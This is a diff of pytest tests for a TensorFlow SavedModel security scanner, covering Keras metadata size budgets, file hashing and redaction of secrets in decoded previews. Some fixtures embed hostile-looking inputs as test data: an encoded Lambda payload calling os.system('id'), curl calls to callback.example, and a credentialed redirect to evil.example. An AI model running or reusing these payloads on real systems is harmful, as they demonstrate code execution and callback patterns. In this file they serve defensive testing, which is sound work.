@@ -1,5 +1,7 @@
 import base64
 import builtins
+import hashlib
+import io
 import pickle
 import shutil
 from pathlib import Path
@@ -7,9 +9,9 @@ from typing import Any, Protocol, TypedDict
 
 import pytest
 
+import modelaudit.scanners.tf_savedmodel_scanner as tf_savedmodel_module
 from modelaudit.core import determine_exit_code, scan_model_directory_or_file
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
-from modelaudit.scanners.tf_savedmodel_scanner import _ASSET_PROBE_BYTES, TensorFlowSavedModelScanner
 from modelaudit.utils.file.detection import PROTO0_1_MAX_PROBE_BYTES
 from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as has_tf_protos
 
@@ -57,14 +59,16 @@ def test_tf_savedmodel_scanner_can_handle(tmp_path: Path) -> None:
 
     if has_tf_protos():
         # With vendored protos or TensorFlow, can_handle works for valid paths
-        assert TensorFlowSavedModelScanner.can_handle(str(tf_dir)) is True
-        assert TensorFlowSavedModelScanner.can_handle(str(regular_dir)) is False
-        assert TensorFlowSavedModelScanner.can_handle(str(test_file)) is True  # Now accepts any .pb file
+        assert tf_savedmodel_module.TensorFlowSavedModelScanner.can_handle(str(tf_dir)) is True
+        assert tf_savedmodel_module.TensorFlowSavedModelScanner.can_handle(str(regular_dir)) is False
+        assert (
+            tf_savedmodel_module.TensorFlowSavedModelScanner.can_handle(str(test_file)) is True
+        )  # Now accepts any .pb file
     else:
         # Without protos, can_handle returns False
-        assert TensorFlowSavedModelScanner.can_handle(str(tf_dir)) is False
-        assert TensorFlowSavedModelScanner.can_handle(str(regular_dir)) is False
-        assert TensorFlowSavedModelScanner.can_handle(str(test_file)) is False
+        assert tf_savedmodel_module.TensorFlowSavedModelScanner.can_handle(str(tf_dir)) is False
+        assert tf_savedmodel_module.TensorFlowSavedModelScanner.can_handle(str(regular_dir)) is False
+        assert tf_savedmodel_module.TensorFlowSavedModelScanner.can_handle(str(test_file)) is False
 
 
 @pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
@@ -77,10 +81,12 @@ def test_tf_savedmodel_read_failure_is_inconclusive_not_security_finding(
     def raise_os_error(*_args: object, **_kwargs: object) -> None:
         raise OSError("simulated SavedModel read failure")
 
-    monkeypatch.setattr(TensorFlowSavedModelScanner, "can_handle", classmethod(lambda _cls, _path: True))
+    monkeypatch.setattr(
+        tf_savedmodel_module.TensorFlowSavedModelScanner, "can_handle", classmethod(lambda _cls, _path: True)
+    )
     monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner.open", raise_os_error, raising=False)
 
-    direct = TensorFlowSavedModelScanner().scan(path)
+    direct = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(path)
     aggregate = scan_model_directory_or_file(path, cache_scan_results=False)
 
     read_checks = [check for check in direct.checks if check.name == "SavedModel File Read"]
@@ -118,7 +124,7 @@ def test_tf_savedmodel_unreadable_file_preflight_is_operational(
 
     monkeypatch.setattr("modelaudit.scanners.base.os.access", lambda _path, _mode: False)
 
-    direct = TensorFlowSavedModelScanner().scan(str(path))
+    direct = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(path))
     aggregate = scan_model_directory_or_file(str(path), cache_scan_results=False)
 
     assert direct.metadata["operational_error_reason"] == "savedmodel_read_failed"
@@ -139,7 +145,7 @@ def test_tf_savedmodel_unreadable_keras_metadata_is_operational(
 
     monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner.open", raise_os_error, raising=False)
 
-    result = TensorFlowSavedModelScanner().scan(str(metadata_path))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))
     aggregate = scan_model_directory_or_file(str(metadata_path), cache_scan_results=False)
 
     assert result.metadata["operational_error_reason"] == "savedmodel_read_failed"
@@ -168,11 +174,194 @@ def test_tf_savedmodel_directory_keeps_keras_metadata_read_failure_operational(
 
     monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner.open", fail_metadata_read, raising=False)
 
-    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
 
     assert result.metadata["operational_error_reason"] == "savedmodel_read_failed"
     assert result.metadata["scan_outcome_reasons"] == ["savedmodel_read_failed"]
     assert any(check.name == "SavedModel File Read" and check.location == str(metadata_path) for check in result.checks)
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_tf_savedmodel_directory_oversized_keras_metadata_is_inconclusive(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    model_dir = Path(create_tf_savedmodel(tmp_path))
+    metadata_path = model_dir / "keras_metadata.pb"
+    metadata_path.write_bytes(b"A" * 33)
+    monkeypatch.setattr(tf_savedmodel_module, "_MAX_KERAS_METADATA_PARSE_BYTES", 32)
+
+    direct = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
+    aggregate = scan_model_directory_or_file(str(model_dir), cache_scan_results=False)
+
+    budget_checks = [
+        check
+        for check in direct.checks
+        if check.name == "Keras Metadata Parse Budget" and check.location == str(metadata_path)
+    ]
+    assert direct.success is False
+    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert direct.metadata["operational_error_reason"] == "keras_metadata_parse_budget_exceeded"
+    assert direct.metadata["scan_outcome_reasons"] == ["keras_metadata_parse_budget_exceeded"]
+    assert len(budget_checks) == 1
+    assert budget_checks[0].status == CheckStatus.FAILED
+    assert budget_checks[0].severity == IssueSeverity.INFO
+    assert budget_checks[0].details["analysis_incomplete"] is True
+    assert budget_checks[0].details["max_parse_bytes"] == 32
+    assert determine_exit_code(aggregate) == 2
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_tf_savedmodel_standalone_oversized_keras_metadata_is_inconclusive(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    metadata_path = tmp_path / "keras_metadata.pb"
+    metadata_path.write_bytes(b"A" * 33)
+    monkeypatch.setattr(tf_savedmodel_module, "_MAX_KERAS_METADATA_PARSE_BYTES", 32)
+    monkeypatch.setattr(
+        tf_savedmodel_module.TensorFlowSavedModelScanner,
+        "calculate_file_hashes",
+        lambda *_args, **_kwargs: pytest.fail("oversized metadata must be rejected before hashing"),
+    )
+
+    direct = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))
+    aggregate = scan_model_directory_or_file(str(metadata_path), cache_scan_results=False)
+
+    assert direct.success is False
+    assert direct.bytes_scanned == 0
+    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert direct.metadata["operational_error_reason"] == "keras_metadata_parse_budget_exceeded"
+    assert direct.metadata["scan_outcome_reasons"] == ["keras_metadata_parse_budget_exceeded"]
+    assert any(
+        check.name == "Keras Metadata Parse Budget"
+        and check.location == str(metadata_path)
+        and check.details["max_parse_bytes"] == 32
+        for check in direct.checks
+    )
+    assert not any(check.name == "File Integrity Hash" for check in direct.checks)
+    assert determine_exit_code(aggregate) == 2
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_tf_savedmodel_standalone_keras_metadata_swap_to_oversized_is_inconclusive(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    metadata_path = tmp_path / "keras_metadata.pb"
+    metadata_path.write_bytes(b"A")
+    monkeypatch.setattr(tf_savedmodel_module, "_MAX_KERAS_METADATA_PARSE_BYTES", 32)
+    monkeypatch.setattr(tf_savedmodel_module, "open", lambda *_args, **_kwargs: io.BytesIO(b"A" * 33), raising=False)
+    monkeypatch.setattr(
+        tf_savedmodel_module.TensorFlowSavedModelScanner,
+        "calculate_file_hashes",
+        lambda *_args, **_kwargs: pytest.fail("bounded metadata scans must not reopen the path for hashing"),
+    )
+
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))
+
+    assert result.success is False
+    assert result.bytes_scanned == 32
+    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert result.metadata["operational_error_reason"] == "keras_metadata_parse_budget_exceeded"
+    assert not any(check.name == "File Integrity Hash" for check in result.checks)
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_tf_savedmodel_standalone_in_budget_keras_metadata_hashes_bounded_content(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    metadata_path = tmp_path / "keras_metadata.pb"
+    content = b'{"class_name": "Dense"}'
+    metadata_path.write_bytes(content)
+    monkeypatch.setattr(tf_savedmodel_module, "_MAX_KERAS_METADATA_PARSE_BYTES", len(content))
+    monkeypatch.setattr(
+        tf_savedmodel_module.TensorFlowSavedModelScanner,
+        "calculate_file_hashes",
+        lambda *_args, **_kwargs: pytest.fail("bounded metadata scans must hash the analyzed bytes"),
+    )
+
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))
+
+    integrity_checks = [check for check in result.checks if check.name == "File Integrity Hash"]
+    assert result.success is True
+    assert result.bytes_scanned == len(content)
+    assert len(integrity_checks) == 1
+    assert integrity_checks[0].details["sha256"] == hashlib.sha256(content).hexdigest()
+    assert integrity_checks[0].details["file_size"] == len(content)
+    assert result.metadata["file_hashes"]["sha256"] == hashlib.sha256(content).hexdigest()
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_tf_savedmodel_standalone_keras_metadata_tolerates_disabled_md5(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    metadata_path = tmp_path / "keras_metadata.pb"
+    content = b'{"class_name": "Dense"}'
+    metadata_path.write_bytes(content)
+
+    def reject_md5(*_args: object, **_kwargs: object) -> None:
+        raise ValueError("MD5 disabled by system policy")
+
+    monkeypatch.setattr(tf_savedmodel_module.hashlib, "md5", reject_md5)
+
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))
+
+    integrity_checks = [check for check in result.checks if check.name == "File Integrity Hash"]
+    assert result.success is True
+    assert len(integrity_checks) == 1
+    assert integrity_checks[0].details["md5"] is None
+    assert integrity_checks[0].details["sha256"] == hashlib.sha256(content).hexdigest()
+    assert result.metadata["file_hashes"]["md5"] is None
+    assert not any(check.name == "Keras Metadata Scan" for check in result.checks)
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_tf_savedmodel_standalone_keras_metadata_scans_when_md5_is_disabled(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    decoded_code = b'import os\nos.system("id")'
+    encoded_code = base64.b64encode(decoded_code).decode()
+    metadata_path = tmp_path / "keras_metadata.pb"
+    metadata_path.write_bytes(f'"class_name": "Lambda", "function": {{"items": ["{encoded_code}"]}}'.encode())
+
+    def reject_md5(*_args: object, **_kwargs: object) -> None:
+        raise ValueError("MD5 disabled by system policy")
+
+    monkeypatch.setattr(tf_savedmodel_module.hashlib, "md5", reject_md5)
+
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))
+
+    assert result.success is False
+    assert any(
+        check.name == "Lambda Layer Security Check"
+        and check.status == CheckStatus.FAILED
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert result.metadata["file_hashes"]["md5"] is None
+    assert result.metadata["file_hashes"]["sha256"]
+    assert not any(check.name == "Keras Metadata Scan" for check in result.checks)
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_tf_savedmodel_in_budget_keras_metadata_preserves_success(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    model_dir = Path(create_tf_savedmodel(tmp_path))
+    metadata_path = model_dir / "keras_metadata.pb"
+    metadata_path.write_bytes(b'{"class_name": "Dense"}')
+    monkeypatch.setattr(tf_savedmodel_module, "_MAX_KERAS_METADATA_PARSE_BYTES", 64)
+
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
+
+    assert result.success is True
+    assert "scan_outcome" not in result.metadata
+    assert not any(check.name == "Keras Metadata Parse Budget" for check in result.checks)
 
 
 def test_suspicious_function_name_reuses_precompiled_patterns(monkeypatch: pytest.MonkeyPatch) -> None:
@@ -183,8 +372,10 @@ def test_suspicious_function_name_reuses_precompiled_patterns(monkeypatch: pytes
 
     monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner.re.compile", fail_compile)
 
-    assert TensorFlowSavedModelScanner._match_suspicious_function_name("safe_function_name") is None
-    assert TensorFlowSavedModelScanner._match_suspicious_function_name("module.eval") == "eval"
+    assert (
+        tf_savedmodel_module.TensorFlowSavedModelScanner._match_suspicious_function_name("safe_function_name") is None
+    )
+    assert tf_savedmodel_module.TensorFlowSavedModelScanner._match_suspicious_function_name("module.eval") == "eval"
 
 
 def create_tf_savedmodel(tmp_path: Path, *, malicious: bool = False) -> Path:
@@ -273,7 +464,7 @@ def test_tf_savedmodel_scanner_safe_model(tmp_path: Path) -> None:
     """Test scanning a safe TensorFlow SavedModel."""
     model_dir = create_tf_savedmodel(tmp_path)
 
-    scanner = TensorFlowSavedModelScanner()
+    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
     result = scanner.scan(str(model_dir))
 
     assert result.success is True
@@ -289,7 +480,7 @@ def test_tf_savedmodel_scanner_malicious_model(tmp_path: Path) -> None:
     """Test scanning a malicious TensorFlow SavedModel."""
     model_dir = create_tf_savedmodel(tmp_path, malicious=True)
 
-    scanner = TensorFlowSavedModelScanner()
+    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
     result = scanner.scan(str(model_dir))
 
     assert result.success is False
@@ -320,7 +511,7 @@ def test_tf_savedmodel_scanner_invalid_model(tmp_path):
     (invalid_dir / "saved_model.pb").write_bytes(b"dummy content")
     # Missing variables directory
 
-    scanner = TensorFlowSavedModelScanner()
+    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
     result = scanner.scan(str(invalid_dir))
 
     # Should have issues about invalid protobuf format or TensorFlow not installed
@@ -339,7 +530,7 @@ def test_tf_savedmodel_scanner_invalid_model(tmp_path):
 def test_detect_readfile_operation(tmp_path: Path) -> None:
     # Synthesize a SavedModel containing a ReadFile node
     model_path = _create_test_savedmodel_with_op(tmp_path, "ReadFile", "readfile_test")
-    scanner = TensorFlowSavedModelScanner()
+    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
     result = scanner.scan(model_path)
 
     readfile_issues = [i for i in result.issues if i.message and "ReadFile" in i.message]
@@ -352,7 +543,7 @@ def test_detect_readfile_operation(tmp_path: Path) -> None:
 @pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
 def test_detect_pyfunc_operation(tmp_path: Path) -> None:
     model_path = _create_test_savedmodel_with_op(tmp_path, "PyFunc", "pyfunc_test")
-    scanner = TensorFlowSavedModelScanner()
+    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
     result = scanner.scan(model_path)
 
     pyfunc_issues = [i for i in result.issues if i.message and "PyFunc" in i.message]
@@ -366,7 +557,7 @@ def test_detect_pyfunc_operation(tmp_path: Path) -> None:
 def test_detect_loadlibrary_operation(tmp_path: Path, op_name: str) -> None:
     model_path = _create_test_savedmodel_with_op(tmp_path, op_name, f"{op_name.lower()}_test")
 
-    result = TensorFlowSavedModelScanner().scan(model_path)
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
 
     load_library_issues = [
         issue
@@ -384,7 +575,7 @@ def test_detect_loadlibrary_operation(tmp_path: Path, op_name: str) -> None:
 def test_detect_writefile_operation(tmp_path: Path) -> None:
     # Synthesize a SavedModel containing a WriteFile node
     model_path = _create_test_savedmodel_with_op(tmp_path, "WriteFile", "writefile_test")
-    scanner = TensorFlowSavedModelScanner()
+    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
     result = scanner.scan(model_path)
 
     writefile_issues = [i for i in result.issues if i.message and "WriteFile" in i.message]
@@ -421,7 +612,7 @@ def test_detect_suspicious_ops_in_function_definitions(
         model_name=f"function_def_{op_name.lower()}",
     )
 
-    result = TensorFlowSavedModelScanner().scan(model_path)
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
     matching_issues = [issue for issue in result.issues if issue.message and op_name in issue.message]
 
     assert matching_issues, f"Expected detection for {op_name} inside a function definition"
@@ -449,7 +640,7 @@ def test_stateful_partitioned_call_detected_in_function_definition(tmp_path: Pat
         model_name="function_def_stateful_partitioned_call",
     )
 
-    result = TensorFlowSavedModelScanner().scan(model_path)
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
     matching_issues = [
         issue
         for issue in result.issues
@@ -479,7 +670,7 @@ def test_stateful_partitioned_call_ignores_evaluate_like_function_names(tmp_path
         model_name="function_def_stateful_partitioned_call_evaluate",
     )
 
-    result = TensorFlowSavedModelScanner().scan(model_path)
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
 
     assert not any(
         issue.message and "StatefulPartitionedCall with suspicious function" in issue.message for issue in result.issues
@@ -501,7 +692,7 @@ def test_lambda_named_function_definition_nodes_do_not_trigger_lambda_layer_warn
         model_name="function_def_lambda_named_node",
     )
 
-    result = TensorFlowSavedModelScanner().scan(model_path)
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
 
     assert not any(issue.message == "Lambda layer detected in graph" for issue in result.issues)
 
@@ -519,7 +710,7 @@ def test_graph_lambda_named_nodes_still_trigger_lambda_layer_warning(tmp_path: P
         model_name="graph_lambda_named_node",
     )
 
-    result = TensorFlowSavedModelScanner().scan(model_path)
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
     lambda_issues = [issue for issue in result.issues if issue.message == "Lambda layer detected in graph"]
 
     assert lambda_issues, "Expected Lambda layer warning for top-level graph nodes"
@@ -545,7 +736,7 @@ def test_protobuf_string_injection_detected_in_function_definition(tmp_path: Pat
         model_name="function_def_string_injection",
     )
 
-    result = TensorFlowSavedModelScanner().scan(model_path)
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
     injection_issues = [
         issue
         for issue in result.issues
@@ -571,7 +762,7 @@ def test_function_definition_ops_are_counted_in_metadata(tmp_path: Path) -> None
         model_name="count_function_ops",
     )
 
-    result = TensorFlowSavedModelScanner().scan(model_path)
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
 
     assert result.metadata["op_counts"]["WriteFile"] == 2
     assert result.metadata["suspicious_op_found"] is True
@@ -592,7 +783,7 @@ def test_safe_function_definition_ops_do_not_trigger_findings(tmp_path: Path) ->
         model_name="safe_function_def",
     )
 
-    result = TensorFlowSavedModelScanner().scan(model_path)
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
 
     assert result.issues == []
     assert result.metadata["op_counts"]["Const"] == 1
@@ -612,7 +803,7 @@ def test_tf_savedmodel_scanner_with_blacklist(tmp_path: Path) -> None:
     )
 
     # Create scanner with custom blacklist
-    scanner = TensorFlowSavedModelScanner(
+    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner(
         config={"blacklist_patterns": ["suspicious_function"]},
     )
     result = scanner.scan(str(model_dir))
@@ -630,7 +821,7 @@ def test_tf_savedmodel_scanner_none_blacklist_config_stays_quiet(tmp_path: Path)
     model_dir = Path(create_tf_savedmodel(tmp_path))
     (model_dir / "custom_file.txt").write_text("contains harmless text\n", encoding="utf-8")
 
-    result = TensorFlowSavedModelScanner(config={"blacklist_patterns": None}).scan(str(model_dir))
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner(config={"blacklist_patterns": None}).scan(str(model_dir))
 
     assert result.success is True
     assert not any(check.name == "File Read Check" for check in result.checks)
@@ -651,7 +842,7 @@ def test_tf_savedmodel_pyfunc_reference_uses_token_boundaries(tmp_path: Path) ->
         model_name="benign_pyfunc_reference",
     )
 
-    result = TensorFlowSavedModelScanner().scan(model_path)
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
 
     assert result.success is False
     assert not any(
@@ -679,7 +870,7 @@ def test_tf_savedmodel_pyfunc_reference_flags_direct_dangerous_refs(tmp_path: Pa
         model_name="malicious_pyfunc_reference",
     )
 
-    result = TensorFlowSavedModelScanner().scan(model_path)
+    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)
 
     assert result.success is False
     assert any(
@@ -691,6 +882,413 @@ def test_tf_savedmodel_pyfunc_reference_flags_direct_dangerous_refs(tmp_path: Pa
     )
 
 
+def _assert_secret_absent_from_exported_result(result: Any, raw_secret: str) -> None:
+    exported = result.to_json()
+    assert raw_secret not in exported
+    assert "<redacted>" in exported
+
+
+def test_savedmodel_preview_redaction_preserves_benign_context() -> None:
+    preview = tf_savedmodel_module._safe_decoded_preview(
+        "os.system('curl https://callback.example/public/model.bin?download=1')",
+        200,
+    )
+
+    assert "os.system" in preview
+    assert "https://callback.example/public/model.bin?download=1" in preview
+    assert "<redacted>" not in preview
+
+
+def test_savedmodel_preview_redaction_removes_generic_url_userinfo() -> None:
+    preview = tf_savedmodel_module._safe_decoded_preview(
+        "wss://WEBSOCKETTOKEN@socket.example/stream ftp://user:FTPPASSWORD@files.example/model.bin",
+        200,
+    )
+
+    assert "WEBSOCKETTOKEN" not in preview
+    assert "user:FTPPASSWORD" not in preview
+    assert preview.count("<credentials-redacted>@") == 2
+
+
+def test_savedmodel_preview_redaction_removes_path_capability_tokens() -> None:
+    github_token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
+    jwt_token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.signature"
+    preview = tf_savedmodel_module._safe_decoded_preview(
+        f"os.system('curl https://callback.example/{github_token}/model') "
+        f"https://callback.example/api/{jwt_token}/done",
+        500,
+    )
+
+    assert github_token not in preview
+    assert jwt_token not in preview
+    assert "os.system" in preview
+    assert "https://callback.example/<redacted>/model" in preview
+    assert "https://callback.example/api/<redacted>/done" in preview
+
+
+def test_savedmodel_preview_redaction_removes_nested_url_credentials() -> None:
+    preview = tf_savedmodel_module._safe_decoded_preview(
+        "https://callback.example/hook?ok=1;to%6ben=SEMICOLONSECRET123 "
+        "https://callback.example/hook?ok=token%253DNESTEDSECRET456 "
+        "https://callback.example/hook?ok=1&amp;token=HTMLSECRET789",
+        500,
+    )
+
+    assert "SEMICOLONSECRET123" not in preview
+    assert "NESTEDSECRET456" not in preview
+    assert "HTMLSECRET789" not in preview
+    assert preview.count("<redacted>") == 3
+
+
+def test_savedmodel_preview_redaction_removes_bracketed_query_credentials() -> None:
+    preview = tf_savedmodel_module._safe_decoded_preview(
+        "https://callback.example/hook?api_key[]=ARRAYSECRET123&token[0]=INDEXSECRET456&ok=1",
+        500,
+    )
+
+    assert "ARRAYSECRET123" not in preview
+    assert "INDEXSECRET456" not in preview
+    assert "api_key%5B%5D=<redacted>" in preview
+    assert "token%5B0%5D=<redacted>" in preview
+    assert "ok=1" in preview
+
+
+def test_savedmodel_preview_redaction_removes_python_container_secrets() -> None:
+    preview = tf_savedmodel_module._safe_decoded_preview(
+        'private_key = """MULTILINESECRET123\nSTILLSECRET456"""\n'
+        'os.environ["API_KEY"] = "ENVSECRET789"\n'
+        'headers["Authorization"] = "HEADERSECRET000"\n'
+        'config = {"client_secret": "MAPSECRET111", "callback": "https://callback.example/public"}\n'
+        'os.system("id")',
+        500,
+    )
+
+    assert "MULTILINESECRET123" not in preview
+    assert "STILLSECRET456" not in preview
+    assert "ENVSECRET789" not in preview
+    assert "HEADERSECRET000" not in preview
+    assert "MAPSECRET111" not in preview
+    assert "os.system" in preview
+    assert "https://callback.example/public" in preview
+    assert preview.count("<redacted>") == 4
+
+
+def test_savedmodel_preview_redaction_removes_escaped_quote_secret() -> None:
+    preview = tf_savedmodel_module._safe_decoded_preview('api_key = "prefix\\"ESCAPEDSECRET123"\nos.system("id")', 200)
+
+    assert "ESCAPEDSECRET123" not in preview
+    assert 'api_key = "<redacted>"' in preview
+    assert "os.system" in preview
+
+
+def test_savedmodel_preview_redaction_removes_prefixed_and_camel_case_secrets() -> None:
+    preview = tf_savedmodel_module._safe_decoded_preview(
+        'api_key = r"RAWSECRET123"\n'
+        'dbPassword = f"DBSECRET456"\n'
+        'headers["githubToken"] = b"GITHUBSECRET789"\n'
+        'config = {"clientSecret": u"MAPSECRET000"}\n'
+        'os.system("id")',
+        500,
+    )
+
+    assert "RAWSECRET123" not in preview
+    assert "DBSECRET456" not in preview
+    assert "GITHUBSECRET789" not in preview
+    assert "MAPSECRET000" not in preview
+    assert 'api_key = r"<redacted>"' in preview
+    assert 'dbPassword = f"<redacted>"' in preview
+    assert 'headers["githubToken"] = b"<redacted>"' in preview
+    assert '"clientSecret": u"<redacted>"' in preview
+    assert "os.system" in preview
+
+
+def test_savedmodel_preview_redaction_removes_authorization_and_escaped_json_secrets() -> None:
+    preview = tf_savedmodel_module._safe_decoded_preview(
+        'Authorization = "ApiKey AUTHSECRET123"\n'
+        "Authorization: ApiKey AUTHSECRET789\n"
+        r'payload="{\"api_key\":\"ESCAPEDJSONSECRET456\", \"safe\":\"ok\"}"'
+        '\nos.system("id")',
+        500,
+    )
+
+    assert "AUTHSECRET123" not in preview
+    assert "AUTHSECRET789" not in preview
+    assert "ESCAPEDJSONSECRET456" not in preview
+    assert 'Authorization = "<redacted>"' in preview
+    assert "Authorization: <redacted>" in preview
+    assert r"\"api_key\":\"<redacted>\"" in preview
+    assert r"\"safe\":\"ok\"" in preview
+    assert "os.system" in preview
+
+
+def test_savedmodel_preview_redaction_removes_non_scalar_sensitive_values() -> None:
+    preview = tf_savedmodel_module._safe_decoded_preview(
+        '{"api_key": ["ARRAYSECRET123"], "clientSecret": {"nested": "OBJECTSECRET456"}, "safe": true}\n'
+        "api_key: |\n"
+        "  BLOCKSECRET789\n"
+        "os.system('id')",
+        500,
+    )
+
+    assert "ARRAYSECRET123" not in preview
+    assert "OBJECTSECRET456" not in preview
+    assert "BLOCKSECRET789" not in preview
+    assert '"api_key": <redacted>' in preview
+    assert '"clientSecret": <redacted>' in preview
+    assert "api_key: |\n  <redacted>" in preview
+    assert "os.system" in preview
+
+
+def test_savedmodel_preview_redaction_removes_parenthesized_secret_values() -> None:
+    preview = tf_savedmodel_module._safe_decoded_preview(
+        'api_key = ("PARENSECRET123")\n'
+        'headers["Authorization"] = (\n  "HEADERSECRET456"\n)\n'
+        'config = {"clientSecret": ("MAPSECRET789")}\n'
+        'os.system("id")',
+        500,
+    )
+
+    assert "PARENSECRET123" not in preview
+    assert "HEADERSECRET456" not in preview
+    assert "MAPSECRET789" not in preview
+    assert 'api_key = ("<redacted>")' in preview
+    assert 'headers["Authorization"] = (\n  "<redacted>"\n)' in preview
+    assert '"clientSecret": ("<redacted>")' in preview
+    assert "os.system" in preview
+
+
+def test_savedmodel_preview_redaction_does_not_expand_original_window() -> None:
+    private_tail = "PRIVATE_AFTER_LONG_SECRET_SHOULD_NOT_APPEAR"
+    preview = tf_savedmodel_module._safe_decoded_preview(f'api_key = "{"A" * 10_000}"\n{private_tail}', 80)
+
+    assert "AAAA" not in preview
+    assert private_tail not in preview
+    assert 'api_key = "<redacted>' in preview
+    assert preview.endswith("...")
+
+
+def test_savedmodel_preview_redaction_redacts_boundary_crossing_tokens() -> None:
+    github_token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
+    private_tail = "PRIVATE_AFTER_TOKEN_SHOULD_NOT_APPEAR"
+    preview = tf_savedmodel_module._safe_decoded_preview(f"padding{'x' * 62}/{github_token}/{private_tail}", 80)
+
+    assert "ghp_" not in preview
+    assert github_token not in preview
+    assert private_tail not in preview
+    assert "/<redacted>" in preview
+    assert preview.endswith("...")
+
+
+def test_savedmodel_preview_redaction_redacts_boundary_crossing_url_userinfo() -> None:
+    url_prefix = "https://user:very-secret-password"
+    private_tail = "PRIVATE_AFTER_USERINFO_SHOULD_NOT_APPEAR"
+    preview = tf_savedmodel_module._safe_decoded_preview(
+        f"{'x' * (80 - len(url_prefix))}{url_prefix}@example.com/{private_tail}", 80
+    )
+
+    assert "user:very-secret-password" not in preview
+    assert "very-secret-password" not in preview
+    assert private_tail not in preview
+    assert "https://<credentials-redacted>" in preview
+    assert preview.endswith("...")
+
+
+def test_savedmodel_preview_redaction_removes_nested_encoded_query_secrets() -> None:
+    preview = tf_savedmodel_module._safe_decoded_preview(
+        "first=https://example.com/hook?redirect=https%3A%2F%2Fcb%2F%3Fapi_key%5B%5D%3DNESTEDARRAYSECRET123 "
+        "second=https://example.com/hook?payload=%7B%22api_key%22%3A%22JSONSECRET456%22%7D",
+        500,
+    )
+
+    assert "NESTEDARRAYSECRET123" not in preview
+    assert "JSONSECRET456" not in preview
+    assert "redirect=<redacted>" in preview
+    assert "payload=<redacted>" in preview
+
+
+def test_savedmodel_preview_redaction_removes_nested_redirect_url_secrets() -> None:
+    github_token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
+    preview = tf_savedmodel_module._safe_decoded_preview(
+        "first=https://example.com/hook?redirect=https%3A%2F%2Fuser%3Apass%40evil.example%2Fcb "
+        f"second=https://example.com/hook?callback=https%3A%2F%2Fcb.example%2F{github_token}%2Fdone",
+        500,
+    )
+
+    assert "user%3Apass" not in preview
+    assert "user:pass" not in preview
+    assert github_token not in preview
+    assert "redirect=<redacted>" in preview
+    assert "callback=<redacted>" in preview
+
+
+def test_savedmodel_preview_redaction_removes_additional_url_secret_shapes() -> None:
